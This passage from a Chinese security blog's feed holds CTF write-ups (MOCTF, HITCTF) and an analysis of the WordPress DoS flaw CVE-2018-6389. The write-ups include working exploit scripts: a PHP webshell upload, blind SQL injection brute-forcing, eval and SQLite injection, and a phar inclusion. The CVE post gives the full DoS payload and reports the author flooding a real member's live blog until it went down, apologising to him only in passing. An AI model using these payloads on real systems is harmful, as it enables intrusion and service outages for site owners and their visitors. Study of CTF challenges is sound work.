l.append(r)</div><div class="line">        salt+=chr(r+ord(<span class="string">'a'</span>)<span class="number">-1</span>)</div><div class="line">        <span class="comment">#print salt</span></div><div class="line">    <span class="keyword">return</span> salt</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag</span><span class="params">(salt)</span>:</span></div><div class="line">    s=hashlib.sha1(<span class="string">'119.23.73.3'</span>).hexdigest()</div><div class="line">    url1=url+<span class="string">'/uploads/'</span>+s+<span class="string">'/'</span>+<span class="string">'moctf'</span>+salt+<span class="string">'.php'</span></div><div class="line">    data=&#123;<span class="string">"a"</span>:<span class="string">"system('cat ../../flag.php');echo '666666';"</span>&#125;</div><div class="line">    r2=r.post(url1,data=data)</div><div class="line">    <span class="keyword">print</span> salt</div><div class="line">    <span class="keyword">if</span> <span class="string">'404'</span> <span class="keyword">not</span> <span class="keyword">in</span> r2.text:</div><div class="line">    	<span class="keyword">print</span> r2.text</div><div class="line"></div><div class="line">get_flag(<span class="string">'aaaaaa'</span>)</div><div class="line">l=get_rand_list()</div><div class="line">salt=get_salt(l)</div><div class="line">s=<span class="number">0</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100000</span>):</div><div class="line">	s=s+<span class="number">1</span></div><div class="line"><span class="keyword">print</span> s</div><div class="line">words = <span class="string">"10"</span></div><div class="line">o=its.product(words,repeat=<span class="number">6</span>)</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> o:</div><div class="line">	s=<span class="string">""</span>.join(i)</div><div class="line">	salt2=<span class="string">""</span></div><div class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">6</span>):</div><div class="line">	    salt2+=chr(ord(salt[j])-int(s[j]))</div><div class="line">	get_flag(salt2)</div><div class="line">words = <span class="string">"10"</span></div><div class="line">o=its.product(words,repeat=<span class="number">6</span>)</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> o:</div><div class="line">	s=<span class="string">""</span>.join(i)</div><div class="line">	salt2=<span class="string">""</span></div><div class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">6</span>):</div><div class="line">	    salt2+=chr(ord(salt[j])+int(s[j]))</div><div class="line">	get_flag(salt2)</div></pre></td></tr></table></figure></p>
<p>put.py<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#通过`?action=test`调用`test_rand_code`函数发送6次`get_rand_code`结果，一共36个字符，</span></div><div class="line"><span class="comment">#然后提交一个构造好的`?action=test`，上传shell到服务器，在被删除之前就会被listen爆破得到，没爆破到就多爆破几次</span></div><div class="line"></div><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment">#-*- coding:utf-8 -*-</span></div><div class="line"><span class="comment">#by xishir</span></div><div class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</div><div class="line"><span class="keyword">import</span> re</div><div class="line"></div><div class="line">r=req.session()</div><div class="line">url=<span class="string">"http://120.78.57.208:6005/?action="</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_test</span><span class="params">()</span>:</span></div><div class="line">    url2=url+<span class="string">"test"</span></div><div class="line">    r1=r.get(url2)</div><div class="line">    <span class="keyword">print</span> url2</div><div class="line">    <span class="keyword">print</span> r1.text</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span><span class="params">()</span>:</span></div><div class="line">    data=&#123;<span class="string">"filename[4]"</span>:<span class="string">"jpg"</span>,</div><div class="line">          <span class="string">"filename[2]"</span>:<span class="string">"jpg"</span>,</div><div class="line">          <span class="string">"filename[1]"</span>:<span class="string">"php"</span>,</div><div class="line">          <span class="string">"content"</span>:<span class="string">"&lt;script language='php'&gt;assert($_POST[a]);&lt;/script&gt;"</span>,</div><div class="line">          <span class="string">"a"</span>:<span class="string">"system('cat ../../flag.php');"</span></div><div class="line">          &#125;</div><div class="line">    url1=url+<span class="string">"upload"</span></div><div class="line">    r2=r.post(url1,data=data)</div><div class="line">    <span class="keyword">print</span> r2.text</div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</div><div class="line">    get_test()</div><div class="line">upload()</div></pre></td></tr></table></figure></p>
<p>运行结果如下<br><img src="/img/2018moctf2.png" alt=""></p>
<h1 id="感想"><a href="#感想" class="headerlink" title="感想"></a>感想</h1><p>讲一下这次比赛我主要干了那些事吧</p>
<ol>
<li>出题，如上所述</li>
<li>平台搭建，用的是ctfd，docker的方式搭建的，省了很多事</li>
<li>题目部署，除了ping那题，其他的web都是我部署的，尤其是cms那题，反复部署的有点吐，中间有个集大学弟来帮忙，后面比赛的时候还是出了问题</li>
<li>发布题目，emmmmmmmmmm，用ctfd的时候出现了很神奇的情况，在编辑config的时候使用谷歌的自动翻译，保存之后ctfd的web服务就挂掉啦！是个巨坑，现在还不知道咋回事</li>
<li>比赛时候的放题，放hint，运维，水群，哈哈哈哈和大佬们玩耍还是很开心的<br>放一些后台数据<br><img src="/img/2018moctf3.png" alt=""><br><img src="/img/2018moctf4.png" alt=""><br><img src="/img/2018moctf5.png" alt=""></li>
</ol>
<p>原来只是想给我们学校和集大的学弟们体验比赛的，不过对外开放也吸引了许多师傅们来做题，虽然运维得很累，但也学到了很多东西（主要是非预期和部署各种奇葩环境）<br>打一波广告，<a href="http://www.moctf.com/" target="_blank" rel="noopener">http://www.moctf.com/</a><br>MOCTF平台是CodeMonster和Mokirin这两支CTF战队所搭建的一个CTF在线答题系统。题目形式与各大CTF比赛相同。目的是为两个学校中热爱信息安全的同学们提供一个刷题的平台，能够一起学习、进步。</p>
<p>最后祝大家新年快乐！<br><img src="/img/2018moctf6.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;从放假到现在筹办准备了接近两个星期的MOCTF新春欢乐赛终于落幕啦，这次比赛我一共出了1签到+1MISC+3WEB，下面先放官方WriteUp（哇终于能当一回官方了）&lt;br&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.codemonster.cn/tags/CTF/"/>
    
      <category term="WriteUp" scheme="https://www.codemonster.cn/tags/WriteUp/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2018-6389 WordPress通杀DoS漏洞分析</title>
    <link href="https://www.codemonster.cn/2018/02/06/cve-2018-6389-analysis/"/>
    <id>https://www.codemonster.cn/2018/02/06/cve-2018-6389-analysis/</id>
    <published>2018-02-06T07:34:58.000Z</published>
    <updated>2018-05-04T07:47:50.015Z</updated>
    
    <content type="html"><![CDATA[<p>近日，<code>WordPress</code>爆出通杀所有版本的<code>DoS</code>漏洞，CVE编号<code>CVE-2018-6389</code>， 过去九年发布的几乎所有版本的WordPress都受影响，包括最新版本4.9.2，作者给出了poc视频及修补脚本，在poc中他发起的单个请求会导致服务器执行181个I / O操作，并在响应中提供文件内容，但Wordpress团队拒绝承认这个漏洞。<br><a id="more"></a></p>
<p>漏洞相关信息如下</p>
<h3 id="CVE-2018-6389漏洞概要"><a href="#CVE-2018-6389漏洞概要" class="headerlink" title="CVE-2018-6389漏洞概要"></a>CVE-2018-6389漏洞概要</h3><p>针对CVE-2018-6389漏洞情况，安全加整理了相关内容如下，这些内容可能来自于CVE-2018-6389涉及厂商、CVE-2018-6389漏洞信息发布组织、CVE、SecurityFocus及其它第三方组织。</p>
<h3 id="CVE-2018-6389漏洞标识"><a href="#CVE-2018-6389漏洞标识" class="headerlink" title="CVE-2018-6389漏洞标识"></a>CVE-2018-6389漏洞标识</h3><ul>
<li>CVE ID：CVE-2018-6389</li>
<li>BUGTRAQ ID：【BUGTRAQ ID】</li>
<li>漏洞涉及厂商漏洞库ID：【漏洞涉及厂商漏洞库ID】</li>
<li>CNNVD ID：【CNNVD漏洞编号】</li>
<li>绿盟科技漏洞库ID：【绿盟科技漏洞库ID】</li>
</ul>
<h3 id="CVE-2018-6389漏洞相关链接"><a href="#CVE-2018-6389漏洞相关链接" class="headerlink" title="CVE-2018-6389漏洞相关链接"></a>CVE-2018-6389漏洞相关链接</h3><ul>
<li>百度链接：<a href="https://www.baidu.com/s?wd=CVE-2018-6389" target="_blank" rel="noopener">https://www.baidu.com/s?wd=CVE-2018-6389</a></li>
<li>绿盟科技漏洞库链接：<a href="http://www.nsfocus.net/vulndb/{绿盟科技漏洞库ID}" target="_blank" rel="noopener">http://www.nsfocus.net/vulndb/{绿盟科技漏洞库ID}</a></li>
<li>Github链接：<a href="https://github.com/Quitten/WordPress/blob/master/wp-dos-patch.sh" target="_blank" rel="noopener">https://github.com/Quitten/WordPress/blob/master/wp-dos-patch.sh</a></li>
<li>漏洞作者链接：<a href="https://baraktawily.blogspot.in/2018/02/how-to-dos-29-of-world-wide-websites.html" target="_blank" rel="noopener">https://baraktawily.blogspot.in/2018/02/how-to-dos-29-of-world-wide-websites.html</a></li>
</ul>
<h3 id="CVE-2018-6389漏洞详情"><a href="#CVE-2018-6389漏洞详情" class="headerlink" title="CVE-2018-6389漏洞详情"></a>CVE-2018-6389漏洞详情</h3><p>漏洞位于<code>load-scripts.php</code>，该文件是为WordPress管理员设计的，允许将多个JavaScript文件加载到一个请求中，但研究人员注意到可以在登录之前调用该函数来允许任何人调用它，即任何人都可以调用它。<br>通过构造特殊的payload可导致服务器执行<code>181个I/O操作</code>，并发请求的情况下即可达到Dos的效果。<br>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://mywpserver.com/wp-admin/load-scripts.php?c=1&amp;load%5B%5D=eutil,common,wp-a11y,sack,quicktag,colorpicker,editor,wp-fullscreen-stu,wp-ajax-response,wp-api-request,wp-pointer,autosave,heartbeat,wp-auth-check,wp-lists,prototype,scriptaculous-root,scriptaculous-builder,scriptaculous-dragdrop,scriptaculous-effects,scriptaculous-slider,scriptaculous-sound,scriptaculous-controls,scriptaculous,cropper,jquery,jquery-core,jquery-migrate,jquery-ui-core,jquery-effects-core,jquery-effects-blind,jquery-effects-bounce,jquery-effects-clip,jquery-effects-drop,jquery-effects-explode,jquery-effects-fade,jquery-effects-fold,jquery-effects-highlight,jquery-effects-puff,jquery-effects-pulsate,jquery-effects-scale,jquery-effects-shake,jquery-effects-size,jquery-effects-slide,jquery-effects-transfer,jquery-ui-accordion,jquery-ui-autocomplete,jquery-ui-button,jquery-ui-datepicker,jquery-ui-dialog,jquery-ui-draggable,jquery-ui-droppable,jquery-ui-menu,jquery-ui-mouse,jquery-ui-position,jquery-ui-progressbar,jquery-ui-resizable,jquery-ui-selectable,jquery-ui-selectmenu,jquery-ui-slider,jquery-ui-sortable,jquery-ui-spinner,jquery-ui-tabs,jquery-ui-tooltip,jquery-ui-widget,jquery-form,jquery-color,schedule,jquery-query,jquery-serialize-object,jquery-hotkeys,jquery-table-hotkeys,jquery-touch-punch,suggest,imagesloaded,masonry,jquery-masonry,thickbox,jcrop,swfobject,moxiejs,plupload,plupload-handlers,wp-plupload,swfupload,swfupload-all,swfupload-handlers,comment-repl,json2,underscore,backbone,wp-util,wp-sanitize,wp-backbone,revisions,imgareaselect,mediaelement,mediaelement-core,mediaelement-migrat,mediaelement-vimeo,wp-mediaelement,wp-codemirror,csslint,jshint,esprima,jsonlint,htmlhint,htmlhint-kses,code-editor,wp-theme-plugin-editor,wp-playlist,zxcvbn-async,password-strength-meter,user-profile,language-chooser,user-suggest,admin-ba,wplink,wpdialogs,word-coun,media-upload,hoverIntent,customize-base,customize-loader,customize-preview,customize-models,customize-views,customize-controls,customize-selective-refresh,customize-widgets,customize-preview-widgets,customize-nav-menus,customize-preview-nav-menus,wp-custom-header,accordion,shortcode,media-models,wp-embe,media-views,media-editor,media-audiovideo,mce-view,wp-api,admin-tags,admin-comments,xfn,postbox,tags-box,tags-suggest,post,editor-expand,link,comment,admin-gallery,admin-widgets,media-widgets,media-audio-widget,media-image-widget,media-gallery-widget,media-video-widget,text-widgets,custom-html-widgets,theme,inline-edit-post,inline-edit-tax,plugin-install,updates,farbtastic,iris,wp-color-picker,dashboard,list-revision,media-grid,media,image-edit,set-post-thumbnail,nav-menu,custom-header,custom-background,media-gallery,svg-painter&amp;ver=4.9</div></pre></td></tr></table></figure></p>
<h3 id="CVE-2018-6389漏洞测试"><a href="#CVE-2018-6389漏洞测试" class="headerlink" title="CVE-2018-6389漏洞测试"></a>CVE-2018-6389漏洞测试</h3><p>协会的大佬里貌似只有扣神是wordpress博客，对不起了扣神！<br><a href="http://blog.thecosmos.cn" target="_blank" rel="noopener">http://blog.thecosmos.cn</a><br>Dos脚本，启动<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python doser.py  -t 10 -g &quot;http://blog.thecosmos.cn/wp-admin/load-scripts.php?xxxxxxxxxxxxxxxxxx&quot;</div></pre></td></tr></table></figure></p>
<p><img src="/img/CVE-2018-6389-1.png" alt=""><br>再打开网站看看，已经508了，其他人也打不开<br><img src="/img/CVE-2018-6389-2.png" alt=""><br>测试成功，Dos关闭</p>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul>
<li><a href="http://toutiao.secjia.com/cve-2018-6389" target="_blank" rel="noopener">http://toutiao.secjia.com/cve-2018-6389</a></li>
<li><a href="https://baraktawily.blogspot.in/2018/02/how-to-dos-29-of-world-wide-websites.html" target="_blank" rel="noopener">https://baraktawily.blogspot.in/2018/02/how-to-dos-29-of-world-wide-websites.html</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;近日，&lt;code&gt;WordPress&lt;/code&gt;爆出通杀所有版本的&lt;code&gt;DoS&lt;/code&gt;漏洞，CVE编号&lt;code&gt;CVE-2018-6389&lt;/code&gt;， 过去九年发布的几乎所有版本的WordPress都受影响，包括最新版本4.9.2，作者给出了poc视频及修补脚本，在poc中他发起的单个请求会导致服务器执行181个I / O操作，并在响应中提供文件内容，但Wordpress团队拒绝承认这个漏洞。&lt;br&gt;
    
    </summary>
    
    
      <category term="CVE" scheme="https://www.codemonster.cn/tags/CVE/"/>
    
      <category term="WordPress" scheme="https://www.codemonster.cn/tags/WordPress/"/>
    
  </entry>
  
  <entry>
    <title>2018 HITCTF WriteUp</title>
    <link href="https://www.codemonster.cn/2018/02/02/2018-hitctf-writeup/"/>
    <id>https://www.codemonster.cn/2018/02/02/2018-hitctf-writeup/</id>
    <published>2018-02-02T14:34:58.000Z</published>
    <updated>2018-05-04T07:47:50.014Z</updated>
    
    <content type="html"><![CDATA[<p>刚放假正好看到HITCTF，划了几道水题，WriteUp如下<br><a id="more"></a></p>
<h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h3 id="单表代替-100"><a href="#单表代替-100" class="headerlink" title="单表代替 100"></a>单表代替 100</h3><p>用a-z代替各种罗马字符，然后<code>quipqiup</code>词频分析，然后找到稍微完整的句子去找到原文，最后替换完整的文章，flag在末尾<br>HITCTF{Aft3r_all_t0morrow_1s_anoth3r_day}</p>
<h1 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h1><h3 id="Baby-Android-50"><a href="#Baby-Android-50" class="headerlink" title="Baby Android 50"></a>Baby Android 50</h3><p>apk名字是xor，用改之理或者apkkill打开apk，反编译后发现两串字符，<code>异或</code>一下得到flag</p>
<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h3 id="PHPreading"><a href="#PHPreading" class="headerlink" title="PHPreading"></a>PHPreading</h3><p><code>index.php.bak</code>泄露了源码<br>get一个<code>asdfgjxzkallgj8852</code>参数，值为<code>H1TctF2018EzCTF</code>即可拿到flag</p>
<h3 id="BabyEval"><a href="#BabyEval" class="headerlink" title="BabyEval"></a>BabyEval</h3><p>题目给了源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;!--</div><div class="line">$str=@(string)$_GET[<span class="string">'str'</span>];</div><div class="line">blackListFilter($black_list, $str);</div><div class="line"><span class="keyword">eval</span>(<span class="string">'$str="'</span>.addslashes($str).<span class="string">'";'</span>);</div><div class="line">--&gt;</div></pre></td></tr></table></figure></p>
<p>传入<code>str={${phpinfo()}}</code>可以执行，于是构造<br><img src="/img/2018hit1.png" alt=""><br>具体原理可以参考<code>wooyun-2010-024807</code></p>
<h3 id="BabyLeakage"><a href="#BabyLeakage" class="headerlink" title="BabyLeakage"></a>BabyLeakage</h3><p>主页提示要进<code>/news/about/</code>，进去后提示启用了<code>debug</code>，构造<code>/news/about/1</code>发现报错，有个<code>news/auth</code> 路径很可疑<br>打开发现报错给了很多东西，有个数据库账号密码，进数据库后把字段拼起来就是flag<br><img src="/img/2018hit2.png" alt=""><br><img src="/img/2018hit3.png" alt=""></p>
<h3 id="BabyInjection"><a href="#BabyInjection" class="headerlink" title="BabyInjection"></a>BabyInjection</h3><p>题目给了源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line"></div><div class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) || !<span class="keyword">isset</span>($_POST[<span class="string">'passwd'</span>])) &#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">'Login and get the flag'</span>;</div><div class="line">	<span class="keyword">echo</span> <span class="string">'&lt;form action="" method="post"&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">	<span class="keyword">echo</span> <span class="string">'&lt;input name="username" type="text" placeholder="username"/&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">	<span class="keyword">echo</span> <span class="string">'&lt;input name="passwd" type="text" placeholder="passwd"/&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">	<span class="keyword">echo</span> <span class="string">'&lt;input type="submit" &gt;&lt;/input&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">	<span class="keyword">echo</span> <span class="string">'&lt;/form&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">    <span class="keyword">die</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$flag = <span class="string">''</span>;</div><div class="line">$filter = <span class="string">"and|select|from|where|union|join|sleep|benchmark|,|\(|\)|like|rlike|regexp|limit|or"</span>;</div><div class="line"></div><div class="line">$username = $_POST[<span class="string">'username'</span>];</div><div class="line">$passwd = $_POST[<span class="string">'passwd'</span>];</div><div class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/"</span>.$filter.<span class="string">"/is"</span>,$username)==<span class="number">1</span>)&#123;</div><div class="line">    <span class="keyword">die</span>(<span class="string">"Hacker hacker hacker~"</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/"</span>.$filter.<span class="string">"/is"</span>,$passwd)==<span class="number">1</span>)&#123;</div><div class="line">    <span class="keyword">die</span>(<span class="string">"Hacker hacker hacker~"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line">$conn = mysqli_connect();</div><div class="line"></div><div class="line">$query = <span class="string">"SELECT * FROM users WHERE username='&#123;$username&#125;';"</span>;</div><div class="line"><span class="keyword">echo</span> $query.<span class="string">"&lt;br&gt;"</span>;</div><div class="line">$query = mysqli_query($conn, $query);</div><div class="line"><span class="keyword">if</span> (mysqli_num_rows($query) == <span class="number">1</span>)&#123;</div><div class="line">    $result = mysqli_fetch_array($query);</div><div class="line">    <span class="keyword">if</span> ($result[<span class="string">'passwd'</span>] == $passwd)&#123;</div><div class="line">        <span class="keyword">die</span>(<span class="string">'you did it and this is your flag: '</span>.$flag);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span>&#123;</div><div class="line">        <span class="keyword">die</span>(<span class="string">'Wrong password'</span>);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span>&#123;</div><div class="line">    <span class="keyword">die</span>(<span class="string">'Wrong username'</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>过滤了很多东西，构造盲注拿到密码<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># encoding: utf-8</span></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"></div><div class="line">req=requests.session()</div><div class="line">lists=<span class="string">"0123456789abcdefghijklmnopqrstuvwxyz"</span></div><div class="line">flag=<span class="string">''</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</div><div class="line">    url=<span class="string">"http://182.254.247.127:2005/"</span></div><div class="line">    </div><div class="line">    ok=<span class="string">''</span></div><div class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> lists:</div><div class="line">        payload=&#123;<span class="string">"username"</span>:<span class="string">"1'||passwd&lt;'"</span>+flag+s+<span class="string">"'=id#"</span>,<span class="string">"passwd"</span>:<span class="string">""</span>&#125;</div><div class="line">        <span class="keyword">print</span> payload</div><div class="line">        r1=req.post(url,data=payload)</div><div class="line"></div><div class="line">        <span class="keyword">if</span> <span class="string">"username"</span> <span class="keyword">in</span> r1.text:</div><div class="line">            ok=s</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            flag+=ok</div><div class="line">            <span class="keyword">print</span> flag</div><div class="line">            <span class="keyword">break</span></div><div class="line"></div><div class="line">        </div><div class="line">        <span class="comment">#print r1.text</span></div></pre></td></tr></table></figure></p>
<p><img src="/img/2018hit14.png" alt=""><br>然后用密码去拿flag<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> ($result[<span class="string">'passwd'</span>] == $passwd)&#123;</div><div class="line">  <span class="keyword">die</span>(<span class="string">'you did it and this is your flag: '</span>.$flag);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p><img src="/img/2018hit5.png" alt=""></p>
<h3 id="小电影-200"><a href="#小电影-200" class="headerlink" title="小电影 200"></a>小电影 200</h3><p>Ffmpeg读文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python3 ffmpeg.py file:///flag.txt sxcurity.avi</div></pre></td></tr></table></figure></p>
<p><img src="/img/2018hit6.png" alt=""></p>
<h3 id="SecurePY"><a href="#SecurePY" class="headerlink" title="SecurePY"></a>SecurePY</h3><p>参考chybeta<br><a href="https://chybeta.github.io/2017/09/05/TWCTF-2017-Super-Secure-Storage-writeup/" target="_blank" rel="noopener">https://chybeta.github.io/2017/09/05/TWCTF-2017-Super-Secure-Storage-writeup/</a><br><code>__pycache__/app.cpython-35.pyc</code> 读取缓存，反编译得到源码<br>然后爆破key<br><img src="/img/2018hit7.png" alt=""><br>得到key，解密得到flag<br><img src="/img/2018hit8.png" alt=""></p>
<h3 id="BabyWrite"><a href="#BabyWrite" class="headerlink" title="BabyWrite"></a>BabyWrite</h3><p>这题存在文件包含，可以用伪协议读取所有源码，然后发现可以写文件的地方<br>但是写入的文件大概是这样的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$username+&quot; =&gt; &quot;+$password</div></pre></td></tr></table></figure></p>
<p>并且文件后缀为<code>log</code>，而文件包含的部分限定了后缀为<code>.php</code>,尝试<code>%00</code>失败，包含远程文件失败，<br>那就只剩<code>phar://</code>和<code>zip://</code>了，这里就只剩一个问题了，<code>=&gt;</code>该怎么绕过，<br>这里卡了很久，以前看过一航大佬的文章我竟然给忘了，后来给了hint去看了才知道<br><a href="https://www.jianshu.com/p/03e612b9e379" target="_blank" rel="noopener">https://www.jianshu.com/p/03e612b9e379</a><br>知道怎么绕过后就很简单了<br>构造一个含有<code>=&gt;</code>字符串的phar包，<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span>  </div><div class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">'test.phar'</span>, <span class="number">0</span>, <span class="string">'test.phar'</span>);  </div><div class="line">$phar-&gt;buildFromDirectory(dirname(<span class="keyword">__FILE__</span>) . <span class="string">'/project'</span>);  </div><div class="line">$phar-&gt;setDefaultStub(<span class="string">'1 =&gt; 1.php'</span>, <span class="string">'1 =&gt; 1.php'</span>);  </div><div class="line">$phar-&gt;compressFiles(Phar::GZ);</div></pre></td></tr></table></figure></p>
<p>然后把<code>=&gt;</code>前面的作为username，后面的作为password写入log文件夹<br><img src="/img/2018hit9.png" alt=""><br><img src="/img/2018hit10.png" alt=""><br>最后<code>?page=phar://log/xxxx/test</code>包含执行命令读取flag</p>
<h3 id="BabyQuery"><a href="#BabyQuery" class="headerlink" title="BabyQuery"></a>BabyQuery</h3><p>先上参考文章<br><a href="https://klionsec.github.io/2016/05/18/sqlite3-common-injection/" target="_blank" rel="noopener">https://klionsec.github.io/2016/05/18/sqlite3-common-injection/</a><br><a href="http://www.au1ge.xyz/2017/08/28/hitb-ctf-singapore-2017-web-wp/" target="_blank" rel="noopener">http://www.au1ge.xyz/2017/08/28/hitb-ctf-singapore-2017-web-wp/</a><br><a href="http://godot.win/index.php/archives/16/" target="_blank" rel="noopener">http://godot.win/index.php/archives/16/</a></p>
<p>看到题目只有一个按钮，点击，抓包，可以看到发送了一个query参数，用的是graphql ，传递的东西里有个Base32的字符串，解密得到1，尝试发送加引号的Base32字符串，提示只接受一个长度的字符串，于是各种搜索引擎，查到可以列出所有方法名的语句，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">query=&#123; __schema&#123;queryType&#123;fields&#123; name description&#125;&#125;&#125; &#125;</div></pre></td></tr></table></figure></p>
<p><img src="/img/2018hit11.png" alt=""><br>得到另一个方法<code>getscorebyyourname</code>，这个方法可以传递一个<code>name</code>字段，存在sql注入，然后就是查询<code>sqlit3</code>的注入技巧了，最后构造的注入语句<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">111&apos; union select flag from Secr3t_fl4g --+&quot;</div></pre></td></tr></table></figure></p>
<p><img src="/img/2018hit12.png" alt=""></p>
<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>爬墙去youtube看视频拿flag</p>
<h3 id="BaSO4"><a href="#BaSO4" class="headerlink" title="BaSO4"></a>BaSO4</h3><p>反编译pyc得到源码，随机加密base64或base32，一共20次，<br>可以写脚本判断是否有小写字母来区分base64还是base32，因为加密次数不算很多，我是直接肉眼识别手动解密</p>
<h3 id="攻击流量分析"><a href="#攻击流量分析" class="headerlink" title="攻击流量分析"></a>攻击流量分析</h3><p>查看流量发现最后有个加密读取flag.txt的，导出到本地反向解密即可得到flag</p>
<h3 id="键盘流量分析"><a href="#键盘流量分析" class="headerlink" title="键盘流量分析"></a>键盘流量分析</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tshark.exe -r keyboard.pcap -T fields -e usb.capdata &gt; usbdata.txt</div></pre></td></tr></table></figure>
